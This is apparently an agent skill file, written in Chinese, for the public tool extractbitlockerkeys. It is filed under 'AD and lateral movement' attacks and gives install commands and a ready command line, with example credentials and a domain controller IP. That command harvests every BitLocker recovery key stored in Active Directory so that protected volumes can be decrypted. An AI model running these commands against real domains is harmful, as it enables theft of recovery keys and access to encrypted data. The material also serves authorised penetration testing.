---
name: extractbitlockerkeys-dpapi
description: extractbitlockerkeys: 域内 BitLocker 密钥收割。信号:ad攻击,域渗透,只显示有密钥的主机,CSV 输出。
---

# extractbitlockerkeys

- 攻击大类:C30 AD与横向移动
- 上游仓库:https://github.com/p0dalirius/extractbitlockerkeys
- 上游 License:GPL-2.0(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
git clone https://github.com/p0dalirius/extractbitlockerkeys && cd extractbitlockerkeys && pip install -r requirements.txt
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `python3 extractbitlockerkeys.py -u svc -p pass -d corp.local -dc-ip 10.0.0.1` | 域内 BitLocker 恢复密钥收割 |
| `-q` | 只显示有密钥的主机 |
| `-csv` | CSV 输出 |

## 攻击场景 Playbook

### 域内 BitLocker 密钥收割

```bash
python3 extractbitlockerkeys.py -u svc -p pass -d corp.local -dc-ip 10.0.0.1
# 所有备份到 AD 的 BitLocker 恢复密钥一锅端
```

## 注意事项

p0dalirius 出品,从 AD 批量提取各主机备份的 BitLocker 恢复密钥,解密任何被 BitLocker 保护的卷。
